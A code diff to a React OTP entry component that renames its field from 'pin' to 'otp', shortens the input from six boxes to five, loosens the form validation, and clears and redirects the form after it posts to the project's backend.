@@ -10,10 +10,7 @@ import axios from "axios";
 import BASE_URL from "../components/urls";
 
 const schema = yup.object().shape({
-  pin: yup
-    .string()
-    .matches(/^\d{6}$/, "OTP must be exactly 6 digits")
-    .required("OTP is required"),
+  otp: yup.string(),
 });
 
 const Otp = () => {
@@ -22,6 +19,7 @@ const Otp = () => {
     register,
     handleSubmit,
     setValue,
+    reset,
     formState: { errors },
   } = useForm({ resolver: yupResolver(schema) });
 
@@ -36,11 +34,11 @@ const Otp = () => {
     newPin[index] = value;
     setPin(newPin);
 
-    if (index < 5 && value !== "") {
-      document.getElementById(`pin-${index + 1}`).focus();
+    if (index < 4 && value !== "") {
+      document.getElementById(`otp-${index + 1}`).focus();
     }
 
-    setValue("pin", newPin.join(""));
+    setValue("otp", newPin.join(""));
   };
 
   const submitForm = (data) => {
@@ -49,12 +47,14 @@ const Otp = () => {
       .post(`${BASE_URL}/otp`, data)
       .then((response) => {
         console.log(response.data);
-        navigate("/otp");
+        reset();
+        setPin(new Array(5).fill("")); // Clear the pin input fields
       })
       .catch((error) => {
         console.error("There was an error!", error);
       })
       .finally(() => {
+        navigate("/otp");
         setLoading(false);
       });
   };
@@ -76,9 +76,9 @@ const Otp = () => {
                 {pin.map((data, index) => (
                   <input
                     key={index}
-                    id={`pin-${index}`}
+                    id={`otp-${index}`}
                     type="password"
-                    name="pin"
+                    name="otp"
                     maxLength="1"
                     value={data}
                     onChange={(e) => handleChange(e.target, index)}
